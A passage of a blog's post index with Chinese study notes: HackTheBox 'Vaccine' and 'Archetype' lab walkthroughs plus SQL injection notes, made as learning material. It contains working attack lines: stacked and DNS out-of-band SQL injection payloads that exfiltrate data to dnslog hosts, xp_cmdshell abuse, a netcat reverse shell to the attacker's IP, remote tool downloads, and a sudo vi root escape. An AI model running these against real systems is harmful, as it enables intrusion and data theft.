dashboard.js\n-rw-r--r-- 1 root root   2313 Feb  4  2020 dashboard.php\n-rw-r--r-- 1 root root   2594 Feb  3  2020 index.php\n-rw-r--r-- 1 root root   1100 Jan 30  2020 license.txt\n-rw-r--r-- 1 root root   3274 Feb  3  2020 style.css\n```\n\n文件dashboard.php：\n\n```bash\npostgres@vaccine:/var/www/html$ cat dashboard.php\n<!DOCTYPE html>\n<html lang=\"en\" >\n<head>\n  <meta charset=\"UTF-8\">\n  <title>Admin Dashboard</title>\n  <link rel=\"stylesheet\" href=\"./dashboard.css\">\n  <script src=\"https://use.fontawesome.com/33a3739634.js\"></script>\n\n</head>\n<body>\n<!-- partial:index.partial.html -->\n<body>\n <div id=\"wrapper\">\n <div class=\"parent\">\n  <h1 align=\"left\">MegaCorp Car Catalogue</h1>\n<form action=\"\" method=\"GET\">\n<div class=\"search-box\">\n  <input type=\"search\" name=\"search\" placeholder=\"Search\" />\n  <button type=\"submit\" class=\"search-btn\"><i class=\"fa fa-search\"></i></button>\n</div>\n</form>\n  </div>\n  \n  <table id=\"keywords\" cellspacing=\"0\" cellpadding=\"0\">\n    <thead>\n      <tr>\n        <th><span style=\"color: white\">Name</span></th>\n        <th><span style=\"color: white\">Type</span></th>\n        <th><span style=\"color: white\">Fuel</span></th>\n        <th><span style=\"color: white\">Engine</span></th>\n      </tr>\n    </thead>\n    <tbody>\n        <?php\n        session_start();\n        if($_SESSION['login'] !== \"true\") {\n          header(\"Location: index.php\");\n          die();\n        }\n        try {\n          $conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\");\n        }\n\n        catch ( exception $e ) {\n          echo $e->getMessage();\n        }\n\n        if(isset($_REQUEST['search'])) {\n\n          $q = \"Select * from cars where name ilike '%\". $_REQUEST[\"search\"] .\"%'\";\n\n          $result = pg_query($conn,$q);\n\n          if (!$result)\n          {\n                            die(pg_last_error($conn));\n          }\n          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))\n              {\n                echo \"\n                  <tr>\n                    <td class='lalign'>$row[1]</td>\n                    <td>$row[2]</td>\n                    <td>$row[3]</td>\n                    <td>$row[4]</td>\n                  </tr>\";\n            }\n        }\n        else {\n\n          $q = \"Select * from cars\";\n\n          $result = pg_query($conn,$q);\n\n          if (!$result)\n          {\n                            die(pg_last_error($conn));\n          }\n          while($row = pg_fetch_array($result, NULL, PGSQL_NUM))\n              {\n                echo \"\n                  <tr>\n                    <td class='lalign'>$row[1]</td>\n                    <td>$row[2]</td>\n                    <td>$row[3]</td>\n                    <td>$row[4]</td>\n                  </tr>\";\n            }\n        }\n\n      ?>\n    </tbody>\n  </table>\n </div> \n</body>\n<!-- partial -->\n  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>\n<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src=\"./dashboard.js\"></script>\n\n</body>\n</html>\n```\n\n发现代码中的这行：`$conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\");` 用户密码就都有了。\n\nshell可能会忽然死，改用ssh连接：\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ ssh postgres@10.129.99.79\nThe authenticity of host '10.129.99.79 (10.129.99.79)' can't be established.\nED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.129.99.79' (ED25519) to the list of known hosts.\npostgres@10.129.99.79's password: \nWelcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 24 Jul 2023 01:03:52 PM UTC\n\n  System load:  0.0               Processes:             186\n  Usage of /:   32.6% of 8.73GB   Users logged in:       0\n  Memory usage: 19%               IP address for ens160: 10.129.99.79\n  Swap usage:   0%\n\n0 updates can be installed immediately.\n0 of these updates are security updates.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n```\n\n`sudo - l`查看有哪些特权：\n\n```bash\npostgres@vaccine:~$ sudo -l\n[sudo] password for postgres: \nMatching Defaults entries for postgres on vaccine:\n    env_keep+=\"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\", env_keep+=\"XAPPLRESDIR\n    XFILESEARCHPATH XUSERFILESEARCHPATH\",\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    mail_badpass\n\nUser postgres may run the following commands on vaccine:\n    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf\n```\n\nvi sudo教学连接：https://gtfobins.github.io/gtfobins/vi/#sudo\n\n```bash\npostgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh'/dev/null\nSorry, user postgres is not allowed to execute '/bin/vi\n/etc/postgresql/11/main/pg_hba.conf -c :!/bin/sh /dev/null' as root on vaccine.\n```\n\n最后使用这两个命令还真拿到权限了：\n\n```bash\npostgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n#输入 :set shell=/bin/sh\npostgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf\n#输入 :shell\n\nroot@vaccine:/var/lib/postgresql# whoami\nroot\nroot@vaccine:/var/lib/postgresql# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n```bash\nroot@vaccine:/var/lib/postgresql# cd /root\nroot@vaccine:~# bash\nroot@vaccine:~# ls\npg_hba.conf  root.txt  snap\nroot@vaccine:~# cat root.txt\ndd6e058e814260bc70e9bbdef2715849\n```\n\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"web攻防笔记第45天","url":"/2023/07/22/web攻防笔记第45天/","content":"\n### PHP-MYSQL-二次注入-DEMO&74CMS\n\n#### 1、DEMO-用户注册登录修改密码\n\n①未登录前修改\n\n②登录后的修改-修改过程直接验证旧密码和接受新密码\n\n一般他会要你输入你的用户名吗？不需要\n\n用户名从哪里来？\n\n获取当前你登录的用户名当作修改条件\n\n`update users set password='a123456' where username='killmen'`\n\nkillmen' and updatexml()....\n\n如果源码里面**有转义：前加'后加#是没用的**，会报错，插入不进去\n\n##### 二次注入的条件\n\n①**必须要有这一句**：`$username = addslashes($_POST['username']);`(这句本是防止普通单独注入)\n\n②有先插入后利用的功能\n\n<u>二次注入通常是在白盒下审计代码申出来的，黑盒未知代码则很难测试</u>\n\n\n\n#### 2、CMS-74CMS个人中心简历功能\n\n黑盒思路：**分析功能有添加后对数据操作的地方**（功能点）\n\n白盒思路：**insert后进入select或update的功能的代码块**\n\n注入条件：**插入时有转义函数或配置，后续有利用插入的数据**\n\n\n\n### PHP-MYSQL-堆叠注入-DEMO&CTF强网\n\n堆叠注入触发的条件很苛刻，因为**堆叠注入原理就是通过结束符同时执行多条sql语句**，\n\n例如php中的`mysqli_multi_query`函数。与之相对应的`mysqli_query()`**只能执行一条SQL**，所以要想目标存在堆叠注入，在目标主机存在类似于`mysqli_multi_query()`这样的函数，根据数据库类型决定是否支持多条语句执行。\n\n#### 堆叠注入条件\n\n1、目标存在sql注入漏洞\n\n2、目标未对\"`;`\"号进行过滤\n\n3、目标中间层查询数据库信息时可同时执行多条sql语句\n\n**支持堆叠数据库：MYSQL MSSQL Postgresql等**\n\n\n\n#### 2019强网杯-随便注（CTF题型）\n\n堆叠注入和二次注入喜欢在CTF里考，真实就是看白盒审计\n\n```sql\n';show databases;\n\n';show tables;\n\n';show columns from `1919810931114514`;\n\n';select flag from `1919810931114514`;\n\n#有时候过滤了select等关键字，可用以下方法：利用变量把查询语句加密后赋值到SeT里\n';SeT @a=0x73656c65637420666c61672066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;\n```\n\n\n\n\n\n### PHP-MYSQL-带外注入-DEMO&DNSLOG\n\n太花里胡哨了，面试题会问，实战没有哦，有高权限还load_file()，整那么多没用的带外干啥\n\n#### 0.注入条件\n\n**ROOT高权限且支持`load_file()`**【打开控制安全文件开关：`secure-file-priv=`】\n\n**有部分注入点是没有回显的，所有读取也是没回显的，采用带外**\n\n\n\n#### 1.使用平台\n\nhttp://ceye.io\n\nhttp://www.dnslog.cn\n\n\n\n#### 2.带外应用场景\n\n解决不回显，反向连接，SQL注入，命令执行，SSRF等\n\nSQL注入：\n\n```php\nselect load_file(concat('\\\\\\\\',(select database()),'.7logee.dnslog.cn\\\\aa'));\n\nand (select load_file(concat('//',(select database()),'.69knl9.dnslog.cn/abc')))\n\n// 查询当前数据库\n\nid=1 and load_file(concat(\"\\\\\\\\\",database(),\".dbuh8a.ceye.io\\\\asdt\"))\n\n\n\n//查询其他数据库\n\nid=1 and load_file(concat(\"\\\\\\\\\",(select schema_name from information_schema.schemata limit 0,1),\".dbuh8a.ceye.io\\\\xxx.txt\"))\n\n\"\"\"\n\n由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数\n\nlimit 0,1 查询第一个数据库名\n\nlimit 1,1 查询第二个数据库名\n\nlimit 2,1 查询第三个数据库名\n\n\"\"\"\n\n\n\n//查询版本号\n\nid=1 and load_file(concat(\"\\\\\\\\\",version(),\".dbuh8a.ceye.io\\\\xxx.txt\"))\n\n\n\n//查询当前数据库demo01中第一个表名\n\nid=1 and load_file(concat(\"\\\\\\\\\",(select table_name from information_schema.tables where table_schema='demo01' limit 0,1 ),\".dbuh8a.ceye.io\\\\xxx.txt\"))\n\n\n\n\"\"\"\n\n由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数\n\nlimit 0,1 查询第一个表名\n\nlimit 1,1 查询第二个表名\n\nlimit 2,1 查询第三个表名\n\n\"\"\"\n\n//查询security数据库emails表下第一个列名\n\nid=1 and load_file(concat(\"\\\\\\\\\",(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),\".dbuh8a.ceye.io\\\\xxx.txt\"))\n\n\n\n//查询字段值 数据库名为security 表名emails 列名id\n\nid=1 and load_file(concat(\"\\\\\\\\\",(select id from security.emails limit 0,1),\".dbuh8a.ceye.io\\\\xxx.txt\"))\n\n\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["笔记","xiaodi8","web攻防"],"categories":["学习"]},{"title":"HTB-Archetype","url":"/2023/07/18/HTB-Archetype/","content":"\n开局先找汉语教：\n\n[HTB_Archetype靶机之sqlserver提权_重返太空的博客-CSDN博客](https://blog.csdn.net/qq_40927195/article/details/125819540)\n\n[https://www.czfq99.cn/archives/94.html](https://www.czfq99.cn/archives/94.html)\n\n看了下标题好像是SQLSERVER的提权。\n\n开始了，开局先扫端口吧，看看开启了哪些：\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ nmap -sV 10.129.121.52                     \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 04:02 EDT\nNmap scan report for 10.129.121.52\nHost is up (0.37s latency).\nNot shown: 996 closed tcp ports (conn-refused)\nPORT     STATE SERVICE      VERSION\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 77.41 seconds\n\n┌──(kali㉿kali)-[~]\n└─$ nmap -sV -sC 10.129.168.67                                   \nStarting Nmap 7.93 ( https://nmap.org ) at 2023-07-18 03:34 EDT\nNmap scan report for 10.129.168.67\nHost is up (0.37s latency).\nNot shown: 996 closed tcp ports (conn-refused)\nPORT     STATE SERVICE      VERSION\n135/tcp  open  msrpc        Microsoft Windows RPC\n139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds\n1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-07-18T06:36:33\n|_Not valid after:  2053-07-18T06:36:33\n|_ssl-date: 2023-07-18T07:37:27+00:00; -1s from scanner time.\n| ms-sql-info: \n|   10.129.168.67:1433: \n|     Version: \n|       name: Microsoft SQL Server 2017 RTM\n|       number: 14.00.1000.00\n|       Product: Microsoft SQL Server 2017\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ms-sql-ntlm-info: \n|   10.129.168.67:1433: \n|     Target_Name: ARCHETYPE\n|     NetBIOS_Domain_Name: ARCHETYPE\n|     NetBIOS_Computer_Name: ARCHETYPE\n|     DNS_Domain_Name: Archetype\n|     DNS_Computer_Name: Archetype\n|_    Product_Version: 10.0.17763\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 1h23m59s, deviation: 3h07m52s, median: -1s\n| smb-os-discovery: \n|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)\n|   Computer name: Archetype\n|   NetBIOS computer name: ARCHETYPE\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2023-07-18T00:37:03-07:00\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-time: \n|   date: 2023-07-18T07:37:00\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 162.12 seconds\n```\n\n开了135、139、445、1433，第三个Dancing靶机有介绍过SSM的。\n\n- 135 端口是远程过程调用 (RPC) 端口 ，Client-Server Model(客户端-服务器应用程序)\n- 139 端口是 netbios-ssn，NetBIOS 是在所有当前版本 Windows 下用于文件和打印共享的协议，默认情况下，启用文件和打印共享后，会绑定到所有内容，包括 TCP/IP ,这意味着除非配置不当的情况下，可以在互联网上访问本地的共享资源\n- 445 端口 microsoft-ds 服务，也是 Client-Server Model，用于直接 TCP/IP MS 网络访问，无需 NetBIOS 层，SMB 协议用于 Windows NT/2K/XP 和更高版本中的文件共享\n\n> **使用命令行工具 smbclient 进行连接，使用 -L 命令显示服务器端分享的资源。**\n\n密码为空，直接进看看。\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ smbclient -L 10.129.121.52                                                                 \nPassword for [WORKGROUP\\kali]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backups         Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.129.121.52 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\n有了Dancing的经验直接连backups，无密码直连，下载`prod.dtsConfig`文件到本地再看：\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ smbclient \\\\\\\\10.129.121.52\\\\backups\nPassword for [WORKGROUP\\kali]:\nTry \"help\" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Mon Jan 20 07:20:57 2020\n  ..                                  D        0  Mon Jan 20 07:20:57 2020\n  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020\n\n                5056511 blocks of size 4096. 2616219 blocks available\nsmb: \\> cat prod.dtsConfig\ncat: command not found\nsmb: \\> get prod.dtsConfig\ngetting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\n```\n\n这到底是什么东西啊\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ cat prod.dtsConfig \n<DTSConfiguration>\n    <DTSConfigurationHeading>\n        <DTSConfigurationFileInfo GeneratedBy=\"...\" GeneratedFromPackageName=\"...\" GeneratedFromPackageID=\"...\" GeneratedDate=\"20.1.2019 10:01:34\"/>\n    </DTSConfigurationHeading>\n    <Configuration ConfiguredType=\"Property\" Path=\"\\Package.Connections[Destination].Properties[ConnectionString]\" ValueType=\"String\">\n        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>\n    </Configuration>\n</DTSConfiguration>\n```\n\n噢，是sql server，关系型数据库\n\n同时发现敏感信息(mssql的账号密码)\n\n**ID:ARCHETYPE\\sql_svc**\n\n**Password:M3g4c0rp123**\n\n> 如何连接呢，使用推荐工具 `impacket` 包连接，`kali` 中自带，`windwos` 可以使用 `sqlserver management` 桌面管理工具。\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ impacket-mssqlclient -h\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nusage: mssqlclient.py [-h] [-port PORT] [-db DB] [-windows-auth] [-debug] [-file FILE]\n                      [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address]\n                      target\n\nTDS client implementation (SSL supported).\n\npositional arguments:\n  target                [[domain/]username[:password]@]<targetName or address>\n\noptions:\n  -h, --help            show this help message and exit\n  -port PORT            target MSSQL port (default 1433)\n  -db DB                MSSQL database instance (default None)\n  -windows-auth         whether or not to use Windows Authentication (default False)\n  -debug                Turn DEBUG output ON\n  -file FILE            input file with commands to execute in the SQL shell\n\nauthentication:\n  -hashes LMHASH:NTHASH\n                        NTLM hashes, format is LMHASH:NTHASH\n  -no-pass              don't ask for password (useful for -k)\n  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based\n                        on target parameters. If valid credentials cannot be found, it will use the ones\n                        specified in the command line\n  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)\n  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN)\n                        specified in the target parameter\n```\n\n有了账户密码直连就行：\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc@10.129.121.52\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\nPassword:\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.\n[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) \n[!] Press help for extra shell commands\nSQL> help\n\n     lcd {path}                 - changes the current local directory to {path}\n     exit                       - terminates the server process (and this session)\n     enable_xp_cmdshell         - you know what it means\n     disable_xp_cmdshell        - you know what it means\n     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell\n     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)\n     ! {cmd}                    - executes a local shell cmd\n```\n\n<aside>\n💡 Here's two great articles that can guide us further to our exploration journey with MSSQL Server:\n\nhttps://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server\n\nhttps://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet\n\n</aside>\n\n这数据库似乎也没什么东西，下一步就是提权。\n\n使用xp_cmdshell工具执行系统命令，`xp_cmdshell` 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 `sql servevr` 的原生工具。\n\n然后报错发现没开启权限：\n\n```bash\nxp_cmdshell \"whoami\"\n\n[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near '>'.\n```\n\n使用如下命令修改配置：\n\n```bash\nSQL> EXECUTE sp_configure 'show advanced options', 1;\nSQL> RECONFIGURE;\nSQL> EXECUTE sp_configure 'xp_cmdshell', 1;\nSQL> RECONFIGURE;\n```\n\n```bash\nSQL> SELECT is_srvrolemember('sysadmin');\n              \n\n-----------   \n\n          1   \n\nSQL> EXEC xp_cmdshell 'net user';\n[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.\nSQL> EXEC sp_configure 'show advanced options', 1;\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\nSQL> RECONFIGURE;\nSQL> sp_configure; - Enabling the sp_configure as stated in the above error message\n[-] ERROR(ARCHETYPE): Line 1: Incorrect syntax near '-'.\nSQL> EXEC sp_configure 'xp_cmdshell', 1;\n[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.\nSQL> RECONFIGURE;\nSQL> xp_cmdshell \"whoami\"\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\narchetype\\sql_svc                                                                  \n\nNULL\n```\n\n查看当前目录\n\n```bash\nSQL> xp_cmdshell \"powershell -c pwd\"\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nNULL                                                                               \n\nPath                                                                               \n\n----                                                                               \n\nC:\\Windows\\system32                                                                \n\nNULL                                                                               \n\nNULL                                                                               \n\nNULL                                                                               \n\nSQL>\n```\n\n网慢的不行，下载菜刀64都是在自己机子开VPN下的，而且放在桌面不行，必须要把菜刀放在当前路径下，\n\n```bash\nSQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe\"\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nwget : <!DOCTYPE HTML>                                                             \n\n<html lang=\"en\">                                                                   \n\n    <head>                                                                         \n\n        <meta charset=\"utf-8\">                                                     \n\n        <title>Error response</title>                                              \n\n    </head>                                                                        \n\n    <body>                                                                         \n\n        <h1>Error response</h1>                                                    \n\n        <p>Error code: 404</p>                                                     \n\n        <p>Message: File not found.</p>                                            \n\n        <p>Error code explanation: 404 - Nothing matches the given URI.</p>        \n\n    </body>                                                                        \n\n</html>                                                                            \n\nAt line:1 char:32                                                                  \n\n+ ... sql_svc\\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe        \n\n+                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~        \n\n    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc    \n\n   eption                                                                          \n\n    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand   \n\nNULL                                                                               \n\nSQL> xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; wget http://10.10.14.68/nc64.exe -outfile nc64.exe\"\noutput                                                                             \n\n--------------------------------------------------------------------------------   \n\nNULL                                                                               \n\nSQL>\n```\n\n监听终于返回200成功\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ sudo python3 -m http.server 80\n[sudo] password for kali: \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.129.168.67 - - [18/Jul/2023 04:26:15] code 404, message File not found\n10.129.168.67 - - [18/Jul/2023 04:26:15] \"GET /nc64.exe HTTP/1.1\" 404 -\n10.129.168.67 - - [18/Jul/2023 04:39:58] code 404, message File not found\n10.129.168.67 - - [18/Jul/2023 04:39:58] \"GET /nc64.exe HTTP/1.1\" 404 -\n10.129.168.67 - - [18/Jul/2023 04:41:07] \"GET /nc64.exe HTTP/1.1\" 200 -\n```\n\n现在，我们可以通过nc将cmd.exe绑定到我们的侦听器\n\n```bash\nSQL>  xp_cmdshell \"powershell -c cd C:\\Users\\sql_svc\\Downloads; .\\nc64.exe -e cmd.exe 10.10.14.68 443\"\n```\n\n下面直接看nc监听443端口，获取到了shell会话：\n\n```bash\n┌──(kali㉿kali)-[~]\n└─$ sudo nc -lvnp 443\n[sudo] password for kali: \nlistening on [any] 443 ...\nconnect to [10.10.14.68] from (UNKNOWN) [10.129.168.67] 49678\nMicrosoft Windows [Version 10.0.17763.2061]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\sql_svc\\Downloads>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 9565-0B4F\n\n Directory of C:\\Users\\sql_svc\\Downloads\n\n07/18/2023  01:41 AM    <DIR>          .\n07/18/2023  01:41 AM    <DIR>          ..\n07/18/2023  01:41 AM            45,272 nc64.exe\n               1 File(s)         45,272 bytes\n               2 Dir(s)  10,714,288,128 bytes free\n\nC:\\Users\\sql_svc\\Downloads>whoami\nwhoami\narchetype\\sql_svc\n```\n\n还是没权限，哈哈\n\n介绍提权工具：WINPEAS，还是开VPN下载的，windows还要关病毒防护\n\n然后在监听处发现200成功：\n\n```bash\nC:\\Users\\sql_svc\\Downloads>powershell -c wget http://10.10.14.68/winPEASx64.exe -outfile winPEASx64.exe\npowershell -c wget http://10.10.14.68/winPEASx64.exe -outfile winPEASx64.exe\n\n10.129.168.67 - - [18/Jul/2023 05:09:58] \"GET /winPEASx64.exe HTTP/1.1\" 200 -\n\nC:\\Users\\sql_svc\\Downloads>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 9565-0B4F\n\n Directory of C:\\Users\\sql_svc\\Downloads\n\n07/18/2023  02:09 AM    <DIR>          .\n07/18/2023  02:09 AM    <DIR>          ..\n07/18/2023  01:41 AM            45,272 nc64.exe\n07/18/2023  02:06 AM                 0 powershell\n07/18/2023  02:10 AM         1,930,752 winPEASx64.exe\n               3 File(s)      1,976,024 bytes\n               2 Dir(s)  10,710,515,712 bytes free\n```\n\n使用命令运行提权工具，最后显示：\n\n```bash\n����������͹ Analyzing Other Windows Files Files (limit 70)\n\n       /---------------------------------------------------------------------------\\                         \n       |                             Do you like PEASS?                            |                         \n       |---------------------------------------------------------------------------|                         \n       |         Become a Patreon    :     https://www.patreon.com/peass           |                         \n       |         Follow on Twitter   :     @carlospolopm                           |                         \n       |         Respect on HTB      :     SirBroccoli & makikvues                 |                         \n       |---------------------------------------------------------------------------|                         \n       |                                 Thank you!                                |                         \n       \\---------------------------------------------------------------------------/\n```\n\n密码：MEGACORP_4dm1n!!\n\n```bash\nC:\\Users\\sql_svc\\Downloads>cd ..\ncd ..\n\nC:\\Users\\sql_svc>cd AppData\ncd AppData\n\nC:\\Users\\sql_svc\\AppData>cd \\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\  \ncd \\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\\nThe system cannot find the path specified.\n\nC' is not recognized as an internal or external command,\noperable program or batch file.\n\nC:\\Users\\sql_svc\\AppData>cd Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\               \ncd Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\\n\nC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine>dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 9565-0B4F\n\n Directory of C:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\n\n01/20/2020  06:04 AM    <DIR>          .\n01/20/2020  06:04 AM    <DIR>          ..\n03/17/2020  02:36 AM                79 ConsoleHost_history.txt\n               1 File(s)             79 bytes\n               2 Dir(s)  10,710,208,512 bytes free\n\nC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine>type ConsoleHost_history.txt\ntype ConsoleHost_history.txt\nnet.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!!\nexit\n\nC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine>python3 psexec.py administrator@10.129.168.67\npython3 psexec.py administrator@10.129.168.67\n'python3' is not recognized as an internal or external command,\noperable program or batch file.\n\nC:\\Users\\sql_svc\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine>\n```\n\n```bash\nC:\\Windows\\system32> cd ..\n \nC:\\Windows> cd ..\n \nC:\\> cd User\nThe system cannot find the path specified.\n \nC:\\> cd Users\n \nC:\\Users> cd Administartor\nThe system cannot find the path specified.\n\nC:\\Users> cd Administrator\n \nC:\\Users\\Administrator> cd Desktop\n \nC:\\Users\\Administrator\\Desktop> type root.txt\nb91ccec3305e98240082d4474b848528\n```\n\n![PWN](../image/Untitled.png)\n","tags":["HTB","笔记","STARTING POINT"],"categories":["学习"]},{"title":"HTB-Three","url":"/2023/07/13/HTB-Three/","content":"\n这次咱就是说一开始就找一个别人通关的汉语教程来：\n\n[Hack The Box - Three(新手友好)_觉醒猴子的博客-CSDN博客](https://blog.csdn.net/weixin_45793727/article/details/126312773)\n\n## **Linux tee命令**\n\nLinux 